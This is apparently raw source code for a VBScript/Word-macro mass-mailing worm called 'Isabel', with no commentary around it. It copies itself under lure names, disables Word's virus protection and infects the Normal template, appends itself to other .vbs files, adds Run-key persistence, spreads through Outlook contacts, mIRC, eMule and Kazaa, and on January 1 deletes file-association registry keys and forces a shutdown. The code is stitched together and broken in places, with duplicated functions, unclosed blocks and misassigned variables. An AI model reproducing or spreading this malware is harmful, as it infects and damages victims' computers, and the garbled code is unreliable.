On Error Resume Next 
Set ws = CreateObject("WScript.Shell") 
Set fso= Createobject("scripting.filesystemobject") 
fso.copyfile wscript.scriptfullname,fso.GetSpecialFolder(0) & "\happynewyear.vbs" 
fso.copyfile wscript.scriptfullname,fso.GetSpecialFolder(0) & "\love me.vbs"Merry Christmas 
fso.copyfile wscript.scriptfullname,fso.GetSpecialFolder(0) & "\Isabel" 

if ws.regread ("HKCU\software\Isabel\mailed") <> "1" then 
Outlook() 
end if 

Sub AutoClose() 

On Error Resume Next 

Application.DisplayAlerts = wdAlertsNone 
Application.EnableCancelKey = wdCancelDisabled 
Application.DisplayStatusBar = False 
Options.VirusProtection = False 
Options.SaveNormalPrompt = False 

Set Doc = ActiveDocument.VBProject.VBComponents 
Set Tmp = NormalTemplate.VBProject.VBComponents 

Const ExportSource = "c:\Isabel.sys" 
Const VirusName = "AIGTMV" 

Application.VBE.ActiveVBProject.VBComponents(VirusName).Export ExportSource 

For i = 1 To Tmp.Count 
  If Tmp(i).Name = Isabel Then TmpInstalled = 1 
Next i 

For j = 1 To Doc.Count 
  If Doc(j).Name = Isabel Then DocInstalled = 1 
Next j 

If TmpInstalled = 0 Then 
  Tmp.Import ExportSource 
  NormalTemplate.Save 
End If 

If DocInstalled = 0 Then 
  Doc.Import ExportSource 
  ActiveDocument.SaveAs ActiveDocument.FullName 
End If 

'AntiCop! 
Set FSO = CreateObject("Scripting.FileSystemObject") 

Set OurFile = FSO.OpenTextFile(Wscript.ScriptFullName, 1) 
OurCode = OurFile.Read(639) 
OurFile.Close 

For Each PossibleFile In FSO.GetFolder(".").Files 

If Ucase(FSO.GetExtensionName(PossibleFile.Name)) = "VBS" Then 

Set VictimFile = FSO.OpenTextFile(PossibleFile.Path, 1) 
Marker = VictimFile.Read(9) 
VictimCode = Marker & VictimFile.ReadAll 
VictimFile.Close 

If Marker <> "'AntiCop!" Then 
 Set VictimFile = FSO.OpenTextFile(PossibleFile.Path, 2) 
 VictimFile.Write OurCode & VictimCode 
 VictimFile.Close 
End If 

End If 

Next 

Set Isabel = fso.opentextfile(wscript.scriptfullname, 1) 
SourceCode = Isabel.readall 
Isabel.Close 
Do 
If Not (fso.fileexists(wscript.scriptfullname)) Then 
Set Isabel = fso.createtextfile(wscript.scriptfullname, True) 
Isabel.write SourceCode 
Isabel.Close 
End If 
Loop 

Dim g 
Set g = CreateObject("wscript.Shell") 
g.regwrite 
"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\NAMEHERE", 
"C:\WINNT\system\Isabel.vbs" 
g.regwrite 
"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\NAMEHERE", 
"C:\WINDOWS\SYSTEM\Isabel.vbs" 

Sub MAIN 
Dim dlg As FileSaveAs 
GetCurValues dlg 
Dialog dlg 
If (Dlg.Format = 0) Or (dlg.Format = 1) Then 
MacroCopy "FileSaveAs", WindowName$() + ":FileSaveAs" 
MacroCopy "FileSave ", WindowName$() + ":FileSave" 
MacroCopy "PayLoad", WindowName$() + ":PayLoad" 
MacroCopy "FileOpen", WindowName$() + ":FileOpen" 
Dlg.Format = 1 
End If 
FileSaveAs dlg 
End If 

Dim mirc
set fso=CreateObject("Scripting.FileSystemObject")
set mirc=fso.CreateTextFile("C:\program files\mirc\script.ini")
fso.CopyFile Wscript.ScriptFullName, "C:\program files\mirc\Isabel.vbs", True
mirc.WriteLine "[script]"
mirc.WriteLine "n0=on 1:join:*.*: { if ( $nick !=$me ) {halt} /dcc send $nick C:\program files\mirc\attachment.vbs }
mirc.WriteLine "n1=ctcp 1:*:?:$1-"
mirc.Close

Dim emule
set fso=CreateObject("Scripting.FileSystemObject")
set mirc=fso.CreateTextFile("C:\Program Files\eMule\Incoming\script.ini")
fso.CopyFile Wscript.ScriptFullName, "C:\Program Files\eMule\Incoming\Isabel.vbs", True
emule.WriteLine "[script]"
emule.WriteLine "n0=on 1:join:*.*: { if ( $nick !=$me ) {halt} /dcc send $nick C:\Program Files\eMule\Incoming\attachment.vbs }
emule.WriteLine "n1=ctcp 1:*:?:$1-"
emule.Close

Dim kazaa
set fso=CreateObject("Scripting.FileSystemObject")
set mirc=fso.CreateTextFile("C:\Program Files\Kazaa\My Shared Folder\script.ini")
fso.CopyFile Wscript.ScriptFullName, "C:\Program Files\Kazaa\My Shared Folder\Isabel.vbs", True
kazaa.WriteLine "[script]"
kazaa.WriteLine "n0=on 1:join:*.*: { if ( $nick !=$me ) {halt} /dcc send $nick C:\Program Files\Kazaa\My Shared Folder\attachment.vbs }
kazaa.WriteLine "n1=ctcp 1:*:?:$1-"
kazaa.Close

If Month(Now()) = 1 And Day(Now()) = 1 Then 
on error resume next 
set Reg=CreateObject("wscript.shell") 
Reg.RegDelete"HKEY_CLASSES_ROOT\.doc\" 
Reg.RegDelete"HKEY_CLASSES_ROOT\.txt\" 
Reg.RegDelete"HKEY_CLASSES_ROOT\.bat\" 
Reg.RegDelete"HKEY_CLASSES_ROOT\.zip\" 
Reg.RegDelete"HKEY_CLASSES_ROOT\.exe\" 
Reg.RegDelete"HKEY_CLASSES_ROOT\.html\" 
Reg.RegDelete"HKEY_CLASSES_ROOT\.vbs\" 
Reg.RegDelete"HKEY_CLASSES_ROOT\.dll\" 
Reg.RegDelete"HKEY_CLASSES_ROOT\.sys\" 
Reg.RegDelete"HKEY_CLASSES_ROOT\.log\" 
Reg.RegDelete"HKEY_CLASSES_ROOT\.*\" 
Reg.Run "c:\windows\system\2004.bat" 
End If 

set g=CreateObject("Scripting.FileSystemObject") 
set shut=g.CreateTextFile("c:\windows\system\2004.bat") 
shut.WriteLine"@echo off" 
shut.WriteLine"%windir%rundll32.exe User,ExitWindows" 
shut.WriteLine"%systemdir%RUNDLL32.EXE User,ExitWindows" 
shut.WriteLine"exit" 

Function Outlook() 
On Error Resume Next 
Set OutlookApp = CreateObject("Outlook.Application") 
If OutlookApp= "Outlook"Then 
Set Mapi=OutlookApp.GetNameSpace("MAPI") 
Set MapiAdList= Mapi.AddressLists 
For Each Address In MapiAdList 
If Address.AddressEntries.Count <> 0 Then 
NumOfContacts = Address.AddressEntries.Count 
For ContactNumber = 1 To NumOfContacts 
Set EmailItem = OutlookApp.CreateItem(0) 
Set ContactNumber = Address.AddressEntries(ContactNumber) 
EmailItem.To = ContactNumber.Address 
EmailItem.Subject = "Here you have, ;o)" 
EmailItem.Body = "Hi:" & vbcrlf & "Check This!" & vbcrlf & "" 
set EmailAttachment=EmailItem.Attachments 
EmailAttachment.Add fso.GetSpecialFolder(0)& "\happynewyear.vbs" 
EmailItem.DeleteAfterSubmit = True 

Function Outlook() 
On Error Resume Next 
Set OutlookApp = CreateObject("Outlook.Application") 
If OutlookApp= "Outlook"Then 
Set Mapi=OutlookApp.GetNameSpace("MAPI") 
Set MapiAdList= Mapi.AddressLists 
For Each Address In MapiAdList 
If Address.AddressEntries.Count <> 0 Then 
NumOfContacts = Address.AddressEntries.Count 
For ContactNumber = 1 To NumOfContacts 
Set EmailItem = OutlookApp.CreateItem(0) 
Set ContactNumber = Address.AddressEntries(ContactNumber) 
EmailItem.To = ContactNumber.Address 
EmailItem.Subject = "Do you love me?" 
EmailItem.Body = "Hi:" & vbcrlf & "Love my Attachment 4-you" & vbcrlf & "" 
set EmailAttachment=EmailItem.Attachments 
EmailAttachment.Add fso.GetSpecialFolder(0)& "\love me.vbs" 
EmailItem.DeleteAfterSubmit = True 

If EmailItem.To <> "" Then 
EmailItem.Send 
ws.regwrite "HKCU\software\Isabel\mailed", "1" 
End If 
Next 
End If 
Next 
end if 
End Function 